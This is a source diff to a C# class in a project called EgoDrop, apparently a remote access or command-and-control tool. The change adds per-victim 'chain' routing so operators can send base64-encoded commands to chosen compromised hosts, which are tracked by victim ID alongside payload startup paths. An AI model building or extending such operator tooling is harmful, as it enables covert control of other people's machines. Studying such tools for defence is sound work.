@@ -27,7 +27,7 @@ namespace EgoDrop
             public string szFilePath;                         //Payload startup file path.
         }
 
-        public List<string> m_lsVictim;
+        public Dictionary<string, List<string>> m_dicVictimChain = new Dictionary<string, List<string>>();
 
         public Socket m_sktClnt           { get; set; }       //Socket object.
         public SslStream m_sslClnt        { get; set; }       //SSL object.
@@ -82,6 +82,63 @@ namespace EgoDrop
 
             m_crypto     = new clsCrypto(true);
         }
+
+        #region VictimChain
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="szVictimID"></param>
+        /// <param name="lsChain"></param>
+        public void fnAddVictimChain(string szVictimID, List<string> lsChain)
+        {
+            if (!m_dicVictimChain.ContainsKey(szVictimID))
+            {
+                m_dicVictimChain.Add(szVictimID, lsChain);
+            }
+            else
+            {
+                MessageBox.Show("Exists chain: " + szVictimID + "\nThe original chain will be replaced.", "fnAddVictimChain()", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                m_dicVictimChain.Remove(szVictimID);
+                m_dicVictimChain.Add(szVictimID, lsChain);
+            }
+        }
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="szVictimID"></param>
+        /// <returns></returns>
+        public List<string> fnGetVictimChain(string szVictimID)
+        {
+            if (m_dicVictimChain.ContainsKey(szVictimID))
+                return m_dicVictimChain[szVictimID];
+            else
+                return new List<string>();
+        }
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="szVictimID"></param>
+        public void fnDeleteVictimChain(string szVictimID)
+        {
+            if (m_dicVictimChain.ContainsKey(szVictimID))
+                m_dicVictimChain.Remove(szVictimID);
+            else
+                MessageBox.Show("Cannot find chain: " + szVictimID);
+        }
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <returns></returns>
+        public List<string> fnlsGetVictims()
+        {
+            return m_dicVictimChain.Keys.ToList();
+        }
+
+        #endregion
 
         /// <summary>
         /// Send data.
@@ -146,11 +203,15 @@ namespace EgoDrop
         /// <param name="szMsg"></param>
         public void fnSendCommand(string szMsg) => fnSendCommand(szMsg.Split('|').ToList());
 
+        public void fnSendCommand(string szVictimID, string szMsg) => fnSendCommand(szVictimID, szMsg.Split('|').ToList());
+
         /// <summary>
         /// 
         /// </summary>
         /// <param name="aMsg"></param>
         public void fnSendCommand(string[] aMsg) => fnSendCommand(aMsg.ToList());
+
+        public void fnSendCommand(string szVictimID, string[] aMsg) => fnSendCommand(szVictimID, aMsg.ToList());
 
         /// <summary>
         /// 
@@ -158,8 +219,6 @@ namespace EgoDrop
         /// <param name="lsMsg"></param>
         public void fnSendCommand(List<string> lsMsg)
         {
-            m_lsVictim = m_lsVictim == null ? new List<string>() : m_lsVictim;
-            lsMsg = m_lsVictim.Concat(lsMsg).ToList();
             lsMsg = lsMsg.Select(x => clsEZData.fnStrE2B64(x)).ToList();
             string szMsg = string.Join("|", lsMsg);
             byte[] abBuffer = { };
@@ -182,6 +241,14 @@ namespace EgoDrop
                     fnHttpSend(2, 0, abBuffer);
                     break;
             }
+        }
+
+        public void fnSendCommand(string szVictimID, List<string> lsMsg)
+        {
+            List<string> lsVictim = m_dicVictimChain[szVictimID];
+            lsMsg = lsVictim.Concat(lsMsg).ToList();
+
+            fnSendCommand(lsMsg);
         }
 
         /// <summary>
